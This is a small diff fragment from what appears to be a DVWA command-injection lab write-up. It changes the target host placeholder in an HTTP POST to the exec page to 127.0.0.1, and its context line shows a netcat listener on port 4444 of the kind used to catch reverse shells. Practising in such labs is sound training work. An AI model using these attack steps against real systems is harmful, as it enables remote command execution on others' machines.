@@ -107,7 +107,7 @@ nc -lvnp 4444
 
 ```http
 POST /dvwa/vulnerabilities/exec/ HTTP/1.1
-Host: 靶机IP
+Host: 127.0.0.1
 Cookie: PHPSESSID=...; security=low
 Content-Type: application/x-www-form-urlencoded
 
